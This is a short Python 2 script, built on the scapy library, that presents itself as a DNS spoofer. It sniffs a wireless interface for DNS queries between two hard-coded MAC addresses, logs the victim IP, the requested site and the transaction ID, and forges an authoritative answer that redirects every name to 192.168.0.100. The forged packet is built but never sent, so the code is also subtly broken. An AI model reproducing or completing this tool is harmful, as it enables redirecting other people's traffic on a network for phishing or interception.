#!/usr/bin/python
from scapy.all import *

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

print        "   "+G+"            ''''''''''''''''''''''''''''''''''''''''''''''''''''''''' "
print        "   "+R+"            ''''''''''''''''    DNS SPOOFER    '''''''''''''''''''''' "
print        "   "+W+"            ''''''''''''''''        &          '''''''''''''''''''''' "
print        "   "+B+"            ''''''''''''''''     RESOLVER      '''''''''''''''''''''' "
print        "   "+O+"            ''''''''''''''''        BY         '''''''''''''''''''''' "
print        "   "+P+"            '''''''''''''  M@NO#@R "+G+" SINGH "+P+" RAJAWAT  ''''''''''''''''' "

def packet_handler(packet):
  for pckt in packet:
      if pckt.haslayer(UDP) and pckt.haslayer(DNS) and pckt.haslayer(DNSQR):
        udp_source=pckt[UDP].sport
      if pckt.haslayer(DNS):
        if pckt[Ether].dst=='24:fd:52:fc:eb:39' and pckt[Ether].src=='14:a3:64:19:09:ff':
          pcktsrc=pckt[Ether].src
          ip_id=pckt[IP].id
          dns_source=pckt[IP].src
          dns_act_ser=pckt[IP].dst
          id_for_spoof=pckt[DNS].id
          query=pckt[DNSQR].qname
          rqname=query+'.'
          if pckt.haslayer(DNSQR):
            if pckt[DNSQR].qname:
              spoof_it(pckt)
          print '\n'
          print ' '+R+'USER_IP:%s' % dns_source +W+'  '+G+'WEBSITE:%s' % query +W+'  '+P+'SECURE_ID:%s' % id_for_spoof +B+'  ACTUAL_SERVER:%s ' % dns_act_ser
      
def spoof_it(pckt1):
   dns_ans=IP(src=pckt1[IP].dst,dst=pckt1[IP].src)/UDP(dport=pckt1[UDP].sport,sport=pckt1[UDP].dport)/DNS(id=pckt1[DNS].id,qr=1,aa=1,qd=pckt1[DNS].qd,an=DNSRR(rrname=pckt1[DNS].qd.qname,ttl=10,rdata='192.168.0.100'))
sniff(iface='wlan0',prn=packet_handler)
